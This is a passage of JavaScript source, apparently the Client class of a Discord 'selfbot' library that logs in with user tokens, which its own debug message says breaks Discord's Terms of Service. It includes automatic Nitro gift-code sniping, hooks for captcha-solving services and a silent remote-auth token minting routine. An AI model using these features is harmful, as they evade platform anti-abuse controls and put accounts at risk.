'use strict';

const process = require('node:process');
const { setInterval, setTimeout } = require('node:timers');
const { Collection } = require('@discordjs/collection');
const { getVoiceConnection } = require('@discordjs/voice');
const axios = require('axios');
const chalk = require('chalk');
const BaseClient = require('./BaseClient');
const ActionsManager = require('./actions/ActionsManager');
const ClientVoiceManager = require('./voice/ClientVoiceManager');
const WebSocketManager = require('./websocket/WebSocketManager');
const { Error, TypeError, RangeError } = require('../errors');
const Discord = require('../index');
const BaseGuildEmojiManager = require('../managers/BaseGuildEmojiManager');
const BillingManager = require('../managers/BillingManager');
const ChannelManager = require('../managers/ChannelManager');
const ClientUserSettingManager = require('../managers/ClientUserSettingManager');
const DeveloperPortalManager = require('../managers/DeveloperPortalManager');
const GuildManager = require('../managers/GuildManager');
const RelationshipManager = require('../managers/RelationshipManager');
const SessionManager = require('../managers/SessionManager');
const UserManager = require('../managers/UserManager');
const VoiceStateManager = require('../managers/VoiceStateManager');
const ShardClientUtil = require('../sharding/ShardClientUtil');
const ClientPresence = require('../structures/ClientPresence');
const GuildPreview = require('../structures/GuildPreview');
const GuildTemplate = require('../structures/GuildTemplate');
const Invite = require('../structures/Invite');
const { CustomStatus } = require('../structures/RichPresence');
const { Sticker } = require('../structures/Sticker');
const StickerPack = require('../structures/StickerPack');
const VoiceRegion = require('../structures/VoiceRegion');
const Webhook = require('../structures/Webhook');
const Widget = require('../structures/Widget');
const { Events, InviteScopes, Status, captchaServices } = require('../util/Constants');
const DataResolver = require('../util/DataResolver');
const Intents = require('../util/Intents');
const Options = require('../util/Options');
const Permissions = require('../util/Permissions');
const DiscordAuthWebsocket = require('../util/RemoteAuth');
const Sweepers = require('../util/Sweepers');
const { lazy, testImportModule } = require('../util/Util');
const Message = lazy(() => require('../structures/Message').Message);
// Patch

/**
 * The main hub for interacting with the Discord API, and the starting point for any bot.
 * @extends {BaseClient}
 */
class Client extends BaseClient {
  /**
   * @param {ClientOptions} options Options for the client
   */
  constructor(options = {}) {
    super(options);

    const data = require('node:worker_threads').workerData ?? process.env;
    const defaults = Options.createDefault();

    if (this.options.shards === defaults.shards) {
      if ('SHARDS' in data) {
        this.options.shards = JSON.parse(data.SHARDS);
      }
    }

    if (this.options.shardCount === defaults.shardCount) {
      if ('SHARD_COUNT' in data) {
        this.options.shardCount = Number(data.SHARD_COUNT);
      } else if (Array.isArray(this.options.shards)) {
        this.options.shardCount = this.options.shards.length;
      }
    }

    const typeofShards = typeof this.options.shards;

    if (typeofShards === 'undefined' && typeof this.options.shardCount === 'number') {
      this.options.shards = Array.from({ length: this.options.shardCount }, (_, i) => i);
    }

    if (typeofShards === 'number') this.options.shards = [this.options.shards];

    if (Array.isArray(this.options.shards)) {
      this.options.shards = [
        ...new Set(
          this.options.shards.filter(item => !isNaN(item) && item >= 0 && item < Infinity && item === (item | 0)),
        ),
      ];
    }

    this._validateOptions();

    /**
     * Functions called when a cache is garbage collected or the Client is destroyed
     * @type {Set<Function>}
     * @private
     */
    this._cleanups = new Set();

    /**
     * The finalizers used to cleanup items.
     * @type {FinalizationRegistry}
     * @private
     */
    this._finalizers = new FinalizationRegistry(this._finalize.bind(this));

    /**
     * The WebSocket manager of the client
     * @type {WebSocketManager}
     */
    this.ws = new WebSocketManager(this);

    /**
     * The action manager of the client
     * @type {ActionsManager}
     * @private
     */
    this.actions = new ActionsManager(this);

    /**
     * The voice manager of the client
     * @type {ClientVoiceManager}
     */
    this.voice = new ClientVoiceManager(this);

    /**
     * A manager of the voice states of this client (Support DM / Group DM)
     * @type {VoiceStateManager}
     */
    this.voiceStates = new VoiceStateManager({ client: this });

    /**
     * Shard helpers for the client (only if the process was spawned from a {@link ShardingManager})
     * @type {?ShardClientUtil}
     */
    this.shard = process.env.SHARDING_MANAGER
      ? ShardClientUtil.singleton(this, process.env.SHARDING_MANAGER_MODE)
      : null;

    /**
     * All of the {@link User} objects that have been cached at any point, mapped by their ids
     * @type {UserManager}
     */
    this.users = new UserManager(this);

    // Patch
    /**
     * All of the relationships {@link User}
     * @type {RelationshipManager}
     */
    this.relationships = new RelationshipManager(this);
    /**
     * All of the settings {@link Object}
     * @type {ClientUserSettingManager}
     */
    this.settings = new ClientUserSettingManager(this);
    /**
     * All of the guilds the client is currently handling, mapped by their ids -
     * as long as sharding isn't being used, this will be *every* guild the bot is a member of
     * @type {GuildManager}
     */
    this.guilds = new GuildManager(this);

    /**
     * Manages the API methods
     * @type {BillingManager}
     */
    this.billing = new BillingManager(this);

    /**
     * All of the sessions of the client
     * @type {SessionManager}
     */
    this.sessions = new SessionManager(this);

    /**
     * All of the {@link Channel}s that the client is currently handling, mapped by their ids -
     * as long as sharding isn't being used, this will be *every* channel in *every* guild the bot
     * is a member of. Note that DM channels will not be initially cached, and thus not be present
     * in the Manager without their explicit fetching or use.
     * @type {ChannelManager}
     */
    this.channels = new ChannelManager(this);

    /**
     * The sweeping functions and their intervals used to periodically sweep caches
     * @type {Sweepers}
     */
    this.sweepers = new Sweepers(this, this.options.sweepers);

    /**
     * The developer portal manager of the client
     * @type {DeveloperPortalManager}
     */
    this.developerPortal = new DeveloperPortalManager(this);

    /**
     * The presence of the Client
     * @private
     * @type {ClientPresence}
     */
    this.presence = new ClientPresence(this, this.options.presence);

    Object.defineProperty(this, 'token', { writable: true });
    if (!this.token && 'DISCORD_TOKEN' in process.env) {
      /**
       * Authorization token for the logged in bot.
       * If present, this defaults to `process.env.DISCORD_TOKEN` when instantiating the client
       * <warn>This should be kept private at all times.</warn>
       * @type {?string}
       */
      this.token = process.env.DISCORD_TOKEN;
    } else {
      this.token = null;
    }

    this._interactionCache = new Collection();

    /**
     * User that the client is logged in as
     * @type {?ClientUser}
     */
    this.user = null;

    /**
     * The application of this bot
     * @type {?ClientApplication}
     */
    this.application = null;

    /**
     * Time at which the client was last regarded as being in the `READY` state
     * (each time the client disconnects and successfully reconnects, this will be overwritten)
     * @type {?Date}
     */
    this.readyAt = null;

    /**
     * Password cache
     * @type {?string}
     */
    this.password = this.options.password;

    /**
     * Nitro cache
     * @type {Array}
     */
    this.usedCodes = [];

    this.session_id = null;

    if (this.options.messageSweepInterval > 0) {
      process.emitWarning(
        'The message sweeping client options are deprecated, use the global sweepers instead.',
        'DeprecationWarning',
      );
      this.sweepMessageInterval = setInterval(
        this.sweepMessages.bind(this),
        this.options.messageSweepInterval * 1_000,
      ).unref();
    }

    setInterval(() => {
      this.usedCodes = [];
      // 1 hours
    }, 3_600_000);
  }

  /**
   * Session ID
   * @type {?string}
   * @readonly
   */
  get sessionId() {
    return this.session_id;
  }

  /**
   * All custom emojis that the client has access to, mapped by their ids
   * @type {BaseGuildEmojiManager}
   * @readonly
   */
  get emojis() {
    const emojis = new BaseGuildEmojiManager(this);
    for (const guild of this.guilds.cache.values()) {
      if (guild.available) for (const emoji of guild.emojis.cache.values()) emojis.cache.set(emoji.id, emoji);
    }
    return emojis;
  }

  /**
   * Timestamp of the time the client was last `READY` at
   * @type {?number}
   * @readonly
   */
  get readyTimestamp() {
    return this.readyAt?.getTime() ?? null;
  }

  /**
   * How long it has been since the client last entered the `READY` state in milliseconds
   * @type {?number}
   * @readonly
   */
  get uptime() {
    return this.readyAt ? Date.now() - this.readyAt : null;
  }

  /**
   * @external VoiceConnection
   * @see {@link https://discord.js.org/#/docs/voice/main/class/VoiceConnection}
   */
  /**
   * Get connection to current call
   * @type {?VoiceConnection}
   * @readonly
   */
  get callVoice() {
    return getVoiceConnection(null);
  }

  /**
   * Logs the client in, establishing a WebSocket connection to Discord.
   * @param {string} [token=this.token] Token of the account to log in with
   * @returns {Promise<string>} Token of the account used
   * @example
   * client.login('my token');
   */
  async login(token = this.token) {
    if (!token || typeof token !== 'string') throw new Error('TOKEN_INVALID');
    this.token = token = token.replace(/^(Bot|Bearer)\s*/i, '');
    this.emit(
      Events.DEBUG,
      `
      Logging on with a user token is unfortunately against the Discord
      \`Terms of Service\` <https://support.discord.com/hc/en-us/articles/115002192352>
      and doing so might potentially get your account banned.
      Use this at your own risk.
`,
    );
    this.emit(
      Events.DEBUG,
      `Provided token: ${token
        .split('.')
        .map((val, i) => (i > 1 ? val.replace(/./g, '*') : val))
        .join('.')}`,
    );

    if (this.options.presence) {
      this.options.ws.presence = this.presence._parse(this.options.presence);
    }

    this.emit(Events.DEBUG, 'Preparing to connect to the gateway...');

    try {
      await this.ws.connect();
      return this.token;
    } catch (error) {
      this.destroy();
      throw error;
    }
  }

  /**
   * Login Discord with Username and Password
   * @param {string} username Email or Phone Number
   * @param {?string} password Password
   * @param {?string} mfaCode 2FA Code / Backup Code
   * @returns {Promise<string>}
   */
  async normalLogin(username, password = this.password, mfaCode) {
    if (!username || !password || typeof username !== 'string' || typeof password !== 'string') {
      throw new Error('NORMAL_LOGIN');
    }
    this.emit(
      Events.DEBUG,
      `Connecting to Discord with: 
      username: ${username}
      password: ${password.replace(/./g, '*')}`,
    );
    const data = await this.api.auth.login.post({
      data: {
        login: username,
        password: password,
        undelete: false,
        captcha_key: null,
        login_source: null,
        gift_code_sku_id: null,
      },
      auth: false,
    });
    this.password = password;
    if (!data.token && data.ticket && data.mfa) {
      this.emit(Events.DEBUG, `Using 2FA Code: ${mfaCode}`);
      const normal2fa = /(\d{6})/g;
      const backupCode = /([a-z0-9]{4})-([a-z0-9]{4})/g;
      if (!mfaCode || typeof mfaCode !== 'string') {
        throw new Error('LOGIN_FAILED_2FA');
      }
      if (normal2fa.test(mfaCode) || backupCode.test(mfaCode)) {
        const data2 = await this.api.auth.mfa.totp.post({
          data: {
            code: mfaCode,
            ticket: data.ticket,
            login_source: null,
            gift_code_sku_id: null,
          },
          auth: false,
        });
        return this.login(data2.token);
      } else {
        throw new Error('LOGIN_FAILED_2FA');
      }
    } else if (data.token) {
      return this.login(data.token);
    } else {
      throw new Error('LOGIN_FAILED_UNKNOWN');
    }
  }

  /**
   * Switch the user
   * @param {string} token User Token
   * @returns {Promise<string>}
   */
  switchUser(token) {
    this._clearCache(this.emojis.cache);
    this._clearCache(this.guilds.cache);
    this._clearCache(this.channels.cache);
    this._clearCache(this.users.cache);
    this._clearCache(this.relationships.cache);
    this._clearCache(this.sessions.cache);
    this._clearCache(this.voiceStates.cache);
    this.ws.status = Status.IDLE;
    return this.login(token);
  }

  /**
   * Sign in with the QR code on your phone.
   * @param {boolean} debug Debug mode
   * @returns {DiscordAuthWebsocket}
   * @example
   * client.QRLogin();
   */
  QRLogin(debug = false) {
    const QR = new DiscordAuthWebsocket({
      autoLogin: true,
      userAgent: this.options.http.headers['User-Agent'],
      wsProperties: this.options.ws.properties,
      debug,
    });
    this.emit(Events.DEBUG, `Preparing to connect to the gateway (QR Login)`, QR);
    return QR.connect(this);
  }

  /**
   * @typedef {Object} remoteAuthConfrim
   * @property {function} yes Yes
   * @property {function} no No
   */

  /**
   * Implement `remoteAuth`, like using your phone to scan a QR code
   * @param {string} url URL from QR code
   * @param {boolean} forceAccept Whether to force confirm `yes`
   * @returns {Promise<remoteAuthConfrim | void>}
   */
  async remoteAuth(url, forceAccept = false) {
    if (!this.isReady()) throw new Error('CLIENT_NOT_READY', 'Remote Auth');
    // Step 1: Parse URL
    url = new URL(url);
    if (
      !['discordapp.com', 'discord.com'].includes(url.hostname) ||
      !url.pathname.startsWith('/ra/') ||
      url.pathname.length <= 4
    ) {
      throw new Error('INVALID_REMOTE_AUTH_URL');
    }
    const hash = url.pathname.replace('/ra/', '');
    // Step 2: Post > Get handshake_token
    const res = await this.api.users['@me']['remote-auth'].post({
      data: {
        fingerprint: hash,
      },
    });
    const handshake_token = res.handshake_token;
    // Step 3: Post
    const yes = () =>
      this.api.users['@me']['remote-auth'].finish.post({ data: { handshake_token, temporary_token: false } });
    const no = () => this.api.users['@me']['remote-auth'].cancel.post({ data: { handshake_token } });
    if (forceAccept) {
      return yes();
    } else {
      return {
        yes,
        no,
      };
    }
  }

  /**
   * Create a new token based on the current token
   * @returns {Promise<string>} New Discord Token
   */
  createToken() {
    return new Promise(resolve => {
      // Step 1: Create DiscordAuthWebsocket
      const QR = new DiscordAuthWebsocket({
        hiddenLog: true,
        generateQR: false,
        autoLogin: false,
        debug: false,
        failIfError: false,
        userAgent: this.options.http.headers['User-Agent'],
        wsProperties: this.options.ws.properties,
      });
      // Step 2: Add event
      QR.once('ready', async (_, url) => {
        await this.remoteAuth(url, true);
      }).once('finish', (user, token) => {
        resolve(token);
      });
      // Step 3: Connect
      QR.connect();
    });
  }

  /**
   * Emitted whenever clientOptions.checkUpdate = false
   * @event Client#update
   * @param {string} oldVersion Current version
   * @param {string} newVersion Latest version
   */

  /**
   * Check for updates
   * @returns {Promise<Client>}
   */
  async checkUpdate() {
    const res_ = await axios
      .get(`https://registry.npmjs.com/${encodeURIComponent('discord.js-selfbot-v13')}`)
      .catch(() => {});
    try {
      const latest_tag = res_.data['dist-tags'].latest;
      this.emit('update', Discord.version, latest_tag);
    } catch {
      this.emit('debug', `${chalk.redBright('[Fail]')} Check Update error`);
      this.emit('update', Discord.version, false);
    }
    return this;
  }

  /**
   * Returns whether the client has logged in, indicative of being able to access
   * properties such as `user` and `application`.
   * @returns {boolean}
   */
  isReady() {
    return this.ws.status === Status.READY;
  }

  /**
   * Logs out, terminates the connection to Discord, and destroys the client.
   * @returns {void}
   */
  destroy() {
    super.destroy();

    for (const fn of this._cleanups) fn();
    this._cleanups.clear();

    if (this.sweepMessageInterval) clearInterval(this.sweepMessageInterval);

    this.sweepers.destroy();
    this.ws.destroy();
    this.token = null;
    this.password = null;
  }

  /**
   * Logs out, terminates the connection to Discord, destroys the client and destroys the token.
   * @returns {Promise<void>}
   */
  async logout() {
    await this.api.auth.logout.post({
      data: {
        provider: null,
        voip_provider: null,
      },
    });
    await this.destroy();
  }

  /**
   * Options used when fetching an invite from Discord.
   * @typedef {Object} ClientFetchInviteOptions
   * @property {Snowflake} [guildScheduledEventId] The id of the guild scheduled event to include with
   * the invite
   */

  /**
   * Obtains an invite from Discord.
   * @param {InviteResolvable} invite Invite code or URL
   * @param {ClientFetchInviteOptions} [options] Options for fetching the invite
   * @returns {Promise<Invite>}
   * @example
   * client.fetchInvite('https://discord.gg/djs')
   *   .then(invite => console.log(`Obtained invite with code: ${invite.code}`))
   *   .catch(console.error);
   */
  async fetchInvite(invite, options) {
    const code = DataResolver.resolveInviteCode(invite);
    const data = await this.api.invites(code).get({
      query: { with_counts: true, with_expiration: true, guild_scheduled_event_id: options?.guildScheduledEventId },
    });
    return new Invite(this, data);
  }

  /**
   * Join this Guild using this invite (Use with caution)
   * @param {InviteResolvable} invite Invite code or URL
   * @returns {Promise<void>}
   * @example
   * await client.acceptInvite('https://discord.gg/genshinimpact')
   */
  async acceptInvite(invite) {
    const code = DataResolver.resolveInviteCode(invite);
    if (!code) throw new Error('INVITE_RESOLVE_CODE');
    if (invite instanceof Invite) {
      await invite.acceptInvite();
    } else {
      await this.api.invites(code).post({
        headers: {
          'X-Context-Properties': 'eyJsb2NhdGlvbiI6Ik1hcmtkb3duIExpbmsifQ==', // Markdown Link
        },
        data: {},
      });
    }
  }

  /**
   * Automatically Redeem Nitro from raw message.
   * @param {Message} message Discord Message
   */
  async autoRedeemNitro(message) {
    if (!(message instanceof Message())) return;
    await this.redeemNitro(message.content, message.channel, false);
  }

  /**
   * Redeem nitro from code or url.
   * @param {string} nitro Nitro url or code
   * @param {TextChannelResolvable} channel Channel that the code was sent in
   * @param {boolean} failIfNotExists Whether to fail if the code doesn't exist
   * @returns {Promise<boolean>}
   */
  async redeemNitro(nitro, channel, failIfNotExists = true) {
    if (typeof nitro !== 'string') throw new Error('INVALID_NITRO');
    channel = this.channels.resolveId(channel);
    const regex = {
      gift: /(discord.gift|discord.com|discordapp.com\/gifts)\/\w{16,25}/gim,
      url: /(discord\.gift\/|discord\.com\/gifts\/|discordapp\.com\/gifts\/)/gim,
    };
    const nitroArray = nitro.match(regex.gift);
    if (!nitroArray) return false;
    const codeArray = nitroArray.map(code => code.replace(regex.url, ''));
    let redeem = false;
    this.emit('debug', `${chalk.greenBright('[Nitro]')} Redeem Nitro: ${nitroArray.join(', ')}`);
    for await (const code of codeArray) {
      if (this.usedCodes.indexOf(code) > -1) continue;
      await this.api.entitlements['gift-codes'](code)
        .redeem.post({
          auth: true,
          data: { channel_id: channel || null, payment_source_id: null },
        })
        .then(() => {
          this.usedCodes.push(code);
          redeem = true;
        })
        .catch(e => {
          this.usedCodes.push(code);
          if (failIfNotExists) throw e;
        });
    }
    return redeem;
  }

  /**
   * Obtains a template from Discord.
   * @param {GuildTemplateResolvable} template Template code or URL
   * @returns {Promise<GuildTemplate>}
   * @example
   * client.fetchGuildTemplate('https://discord.new/FKvmczH2HyUf')
   *   .then(template => console.log(`Obtained template with code: ${template.code}`))
   *   .catch(console.error);
   */
  async fetchGuildTemplate(template) {
    const code = DataResolver.resolveGuildTemplateCode(template);
    const data = await this.api.guilds.templates(code).get();
    return new GuildTemplate(this, data);
  }

  /**
   * Obtains a webhook from Discord.
   * @param {Snowflake} id The webhook's id
   * @param {string} [token] Token for the webhook
   * @returns {Promise<Webhook>}
   * @example
   * client.fetchWebhook('id', 'token')
   *   .then(webhook => console.log(`Obtained webhook with name: ${webhook.name}`))
   *   .catch(console.error);
   */
  async fetchWebhook(id, token) {
    const data = await this.api.webhooks(id, token).get();
    return new Webhook(this, { token, ...data });
  }

  /**
   * Obtains the available voice regions from Discord.
   * @returns {Promise<Collection<string, VoiceRegion>>}
   * @example
   * client.fetchVoiceRegions()
   *   .then(regions => console.log(`Available regions are: ${regions.map(region => region.name).join(', ')}`))
   *   .catch(console.error);
   */
  async fetchVoiceRegions() {
    const apiRegions = await this.api.voice.regions.get();
    const regions = new Collection();
    for (const region of apiRegions) regions.set(region.id, new VoiceRegion(region));
    return regions;
  }

  /**
   * Obtains a sticker from Discord.
   * @param {Snowflake} id The sticker's id
   * @returns {Promise<Sticker>}
   * @example
   * client.fetchSticker('id')
   *   .then(sticker => console.log(`Obtained sticker with name: ${sticker.name}`))
   *   .catch(console.error);
   */
  async fetchSticker(id) {
    const data = await this.api.stickers(id).get();
    return new Sticker(this, data);
  }

  /**
   * Obtains the list of sticker packs available to Nitro subscribers from Discord.
   * @returns {Promise<Collection<Snowflake, StickerPack>>}
   * @example
   * client.fetchPremiumStickerPacks()
   *   .then(packs => console.log(`Available sticker packs are: ${packs.map(pack => pack.name).join(', ')}`))
   *   .catch(console.error);
   */
  async fetchPremiumStickerPacks() {
    const data = await this.api('sticker-packs').get();
    return new Collection(data.sticker_packs.map(p => [p.id, new StickerPack(this, p)]));
  }
  /**
   * A last ditch cleanup function for garbage collection.
   * @param {Function} options.cleanup The function called to GC
   * @param {string} [options.message] The message to send after a successful GC
   * @param {string} [options.name] The name of the item being GCed
   * @private
   */
  _finalize({ cleanup, message, name }) {
    try {
      cleanup();
      this._cleanups.delete(cleanup);
      if (message) {
        this.emit(Events.DEBUG, message);
      }
    } catch {
      this.emit(Events.DEBUG, `Garbage collection failed on ${name ?? 'an unknown item'}.`);
    }
  }

  /**
   * Clear a cache
   * @param {Collection} cache The cache to clear
   * @returns {number} The number of removed entries
   * @private
   */
  _clearCache(cache) {
    return cache.sweep(() => true);
  }

  /**
   * Sweeps all text-based channels' messages and removes the ones older than the max message lifetime.
   * If the message has been edited, the time of the edit is used rather than the time of the original message.
   * @param {number} [lifetime=this.options.messageCacheLifetime] Messages that are older than this (in seconds)
   * will be removed from the caches. The default is based on {@link ClientOptions#messageCacheLifetime}
   * @returns {number} Amount of messages that were removed from the caches,
   * or -1 if the message cache lifetime is unlimited
   * @example
   * // Remove all messages older than 1800 seconds from the messages cache
   * const amount = client.sweepMessages(1800);
   * console.log(`Successfully removed ${amount} messages from the cache.`);
   */
  sweepMessages(lifetime = this.options.messageCacheLifetime) {
    if (typeof lifetime !== 'number' || isNaN(lifetime)) {
      throw new TypeError('INVALID_TYPE', 'lifetime', 'number');
    }
    if (lifetime <= 0) {
      this.emit(Events.DEBUG, "Didn't sweep messages - lifetime is unlimited");
      return -1;
    }

    const messages = this.sweepers.sweepMessages(Sweepers.outdatedMessageSweepFilter(lifetime)());
    this.emit(Events.DEBUG, `Swept ${messages} messages older than ${lifetime} seconds`);
    return messages;
  }

  /**
   * Obtains a guild preview from Discord, available for all guilds the bot is in and all Discoverable guilds.
   * @param {GuildResolvable} guild The guild to fetch the preview for
   * @returns {Promise<GuildPreview>}
   */
  async fetchGuildPreview(guild) {
    const id = this.guilds.resolveId(guild);
    if (!id) throw new TypeError('INVALID_TYPE', 'guild', 'GuildResolvable');
    const data = await this.api.guilds(id).preview.get();
    return new GuildPreview(this, data);
  }

  /**
   * Obtains the widget data of a guild from Discord, available for guilds with the widget enabled.
   * @param {GuildResolvable} guild The guild to fetch the widget data for
   * @returns {Promise<Widget>}
   */
  async fetchGuildWidget(guild) {
    const id = this.guilds.resolveId(guild);
    if (!id) throw new TypeError('INVALID_TYPE', 'guild', 'GuildResolvable');
    const data = await this.api.guilds(id, 'widget.json').get();
    return new Widget(this, data);
  }

  /**
   * Options for {@link Client#generateInvite}.
   * @typedef {Object} InviteGenerationOptions
   * @property {InviteScope[]} scopes Scopes that should be requested
   * @property {PermissionResolvable} [permissions] Permissions to request
   * @property {GuildResolvable} [guild] Guild to preselect
   * @property {boolean} [disableGuildSelect] Whether to disable the guild selection
   */

  /**
   * Generates a link that can be used to invite the bot to a guild.
   * @param {InviteGenerationOptions} [options={}] Options for the invite
   * @returns {string}
   * @example
   * const link = client.generateInvite({
   *   scopes: ['applications.commands'],
   * });
   * console.log(`Generated application invite link: ${link}`);
   * @example
   * const link = client.generateInvite({
   *   permissions: [
   *     Permissions.FLAGS.SEND_MESSAGES,
   *     Permissions.FLAGS.MANAGE_GUILD,
   *     Permissions.FLAGS.MENTION_EVERYONE,
   *   ],
   *   scopes: ['bot'],
   * });
   * console.log(`Generated bot invite link: ${link}`);
   */
  generateInvite(options = {}) {
    if (typeof options !== 'object') throw new TypeError('INVALID_TYPE', 'options', 'object', true);
    if (!this.application) throw new Error('CLIENT_NOT_READY', 'generate an invite link');

    const query = new URLSearchParams({
      client_id: this.application.id,
    });

    const { scopes } = options;
    if (typeof scopes === 'undefined') {
      throw new TypeError('INVITE_MISSING_SCOPES');
    }
    if (!Array.isArray(scopes)) {
      throw new TypeError('INVALID_TYPE', 'scopes', 'Array of Invite Scopes', true);
    }
    if (!scopes.some(scope => ['bot', 'applications.commands'].includes(scope))) {
      throw new TypeError('INVITE_MISSING_SCOPES');
    }
    const invalidScope = scopes.find(scope => !InviteScopes.includes(scope));
    if (invalidScope) {
      throw new TypeError('INVALID_ELEMENT', 'Array', 'scopes', invalidScope);
    }
    query.set('scope', scopes.join(' '));

    if (options.permissions) {
      const permissions = Permissions.resolve(options.permissions);
      if (permissions) query.set('permissions', permissions);
    }

    if (options.disableGuildSelect) {
      query.set('disable_guild_select', true);
    }

    if (options.guild) {
      const guildId = this.guilds.resolveId(options.guild);
      if (!guildId) throw new TypeError('INVALID_TYPE', 'options.guild', 'GuildResolvable');
      query.set('guild_id', guildId);
    }

    return `${this.options.http.api}${this.api.oauth2.authorize}?${query}`;
  }

  toJSON() {
    return super.toJSON({
      readyAt: false,
    });
  }

  /**
   * Calls {@link https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval} on a script
   * with the client as `this`.
   * @param {string} script Script to eval
   * @returns {*}
   * @private
   */
  _eval(script) {
    return eval(script);
  }

  /**
   * Sets the client's presence. (Sync Setting).
   * @param {Client} client Discord Client
   * @private
   */
  customStatusAuto(client) {
    client = client ?? this;
    if (!client.user) return;
    const custom_status = new CustomStatus();
    if (!client.settings.rawSetting.custom_status?.text && !client.settings.rawSetting.custom_status?.emoji_name) {
      client.user.setPresence({
        activities: this.presence.activities.filter(a => a.type !== 'CUSTOM'),
        status: client.settings.rawSetting.status ?? 'invisible',
      });
    } else {
      custom_status.setEmoji({
        name: client.settings.rawSetting.custom_status?.emoji_name,
        id: client.settings.rawSetting.custom_status?.emoji_id,
      });
      custom_status.setState(client.settings.rawSetting.custom_status?.text);
      client.user.setPresence({
        activities: [custom_status.toJSON(), ...this.presence.activities.filter(a => a.type !== 'CUSTOM')],
        status: client.settings.rawSetting.status ?? 'invisible',
      });
    }
  }

  /**
   * Authorize an URL.
   * @param {string} url Discord Auth URL
   * @param {Object} options Oauth2 options
   * @returns {Promise<boolean>}
   * @example
   * client.authorizeURL(`https://discord.com/api/oauth2/authorize?client_id=botID&permissions=8&scope=applications.commands%20bot`, {
      guild_id: "guildID",
      permissions: "62221393", // your permissions
      authorize: true
    })
   */
  async authorizeURL(url, options = {}) {
    const reg = /(api\/)*oauth2\/authorize/gim;
    let searchParams = {};
    const checkURL = () => {
      try {
        // eslint-disable-next-line no-new
        const url_ = new URL(url);
        if (!['discord.com', 'canary.discord.com', 'ptb.discord.com'].includes(url_.hostname)) return false;
        if (!reg.test(url_.pathname)) return false;
        for (const [key, value] of url_.searchParams.entries()) {
          searchParams[key] = value;
        }
        return true;
      } catch (e) {
        return false;
      }
    };
    options = Object.assign(
      {
        authorize: true,
        permissions: '0',
      },
      options,
    );
    if (!url || !checkURL()) {
      throw new Error('INVALID_URL', url);
    }
    await this.api.oauth2.authorize.post({
      query: searchParams,
      data: options,
    });
    return true;
  }

  /**
   * Makes waiting time for Client.
   * @param {number} miliseconds Sleeping time as milliseconds.
   * @returns {Promise<void> | null}
   */
  sleep(miliseconds) {
    return typeof miliseconds === 'number' ? new Promise(r => setTimeout(r, miliseconds)) : null;
  }

  /**
   * Validates the client options.
   * @param {ClientOptions} [options=this.options] Options to validate
   * @private
   */
  _validateOptions(options = this.options) {
    if (typeof options.intents === 'undefined') {
      throw new TypeError('CLIENT_MISSING_INTENTS');
    } else {
      options.intents = Intents.resolve(options.intents);
    }
    if (options && typeof options.checkUpdate !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'checkUpdate', 'a boolean');
    }
    if (options && typeof options.syncStatus !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'syncStatus', 'a boolean');
    }
    if (options && typeof options.autoRedeemNitro !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'autoRedeemNitro', 'a boolean');
    }
    if (options && options.captchaService && !captchaServices.includes(options.captchaService)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'captchaService', captchaServices.join(', '));
    }
    // Parse captcha key
    if (options && captchaServices.includes(options.captchaService) && options.captchaService !== 'custom') {
      if (typeof options.captchaKey !== 'string') {
        throw new TypeError('CLIENT_INVALID_OPTION', 'captchaKey', 'a string');
      }
      switch (options.captchaService) {
        case '2captcha':
          if (options.captchaKey.length !== 32) {
            throw new TypeError('CLIENT_INVALID_OPTION', 'captchaKey', 'a 32 character string');
          }
          break;
      }
    }
    if (options && typeof options.captchaSolver !== 'function') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'captchaSolver', 'a function');
    }
    if (options && typeof options.DMSync !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'DMSync', 'a boolean');
    }
    if (options && typeof options.patchVoice !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'patchVoice', 'a boolean');
    }
    if (options && options.password && typeof options.password !== 'string') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'password', 'a string');
    }
    if (options && options.usingNewAttachmentAPI && typeof options.usingNewAttachmentAPI !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'usingNewAttachmentAPI', 'a boolean');
    }
    if (options && options.interactionTimeout && typeof options.interactionTimeout !== 'number') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'interactionTimeout', 'a number');
    }
    if (options && typeof options.proxy !== 'string') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'proxy', 'a string');
    } else if (
      options &&
      options.proxy &&
      typeof options.proxy === 'string' &&
      testImportModule('proxy-agent') === false
    ) {
      throw new Error('MISSING_MODULE', 'proxy-agent', 'npm install proxy-agent');
    }
    if (typeof options.shardCount !== 'number' || isNaN(options.shardCount) || options.shardCount < 1) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'shardCount', 'a number greater than or equal to 1');
    }
    if (options.shards && !(options.shards === 'auto' || Array.isArray(options.shards))) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'shards', "'auto', a number or array of numbers");
    }
    if (options.shards && !options.shards.length) throw new RangeError('CLIENT_INVALID_PROVIDED_SHARDS');
    if (typeof options.makeCache !== 'function') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'makeCache', 'a function');
    }
    if (typeof options.messageCacheLifetime !== 'number' || isNaN(options.messageCacheLifetime)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'The messageCacheLifetime', 'a number');
    }
    if (typeof options.messageSweepInterval !== 'number' || isNaN(options.messageSweepInterval)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'messageSweepInterval', 'a number');
    }
    if (typeof options.sweepers !== 'object' || options.sweepers === null) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'sweepers', 'an object');
    }
    if (typeof options.invalidRequestWarningInterval !== 'number' || isNaN(options.invalidRequestWarningInterval)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'invalidRequestWarningInterval', 'a number');
    }
    if (!Array.isArray(options.partials)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'partials', 'an Array');
    }
    if (typeof options.waitGuildTimeout !== 'number' || isNaN(options.waitGuildTimeout)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'waitGuildTimeout', 'a number');
    }
    if (typeof options.messageCreateEventGuildTimeout !== 'number' || isNaN(options.messageCreateEventGuildTimeout)) {
